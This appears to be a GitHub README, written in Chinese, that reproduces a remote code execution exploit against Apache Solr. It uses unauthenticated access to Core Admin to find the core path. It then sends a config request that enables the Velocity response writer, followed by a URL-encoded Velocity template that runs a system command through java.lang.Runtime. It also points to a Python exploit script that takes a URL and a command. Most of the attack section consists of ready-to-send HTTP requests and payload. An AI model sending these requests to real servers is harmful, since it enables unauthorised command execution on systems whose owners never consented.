# Apache Solr rce

### 复现过程

step1:
通过Solr未授权访问，访问Core Admin，获取Path
![Image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031164421.png)

step2:
修改配置
```
POST /solr/(第一步获取到的Path)/config HTTP/1.1
Host: ip:8983
User-Agent: xxx
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```
![Image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031165408.png)

step3:
执行命令
```
GET /solr/(第一步获取到的Path)/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: xxx:8983
User-Agent: xxx
```
![Image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031165755.png)

### python exp

使用方法：
python solr_rce.py url "command"
![Image](https://github.com/Eth4nHunt/Apache-Solr-RCE/blob/master/images/20191031170416.png)

### 参考

https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt

https://mp.weixin.qq.com/s/_mwnPuvqBP945D3g-j8Hrw
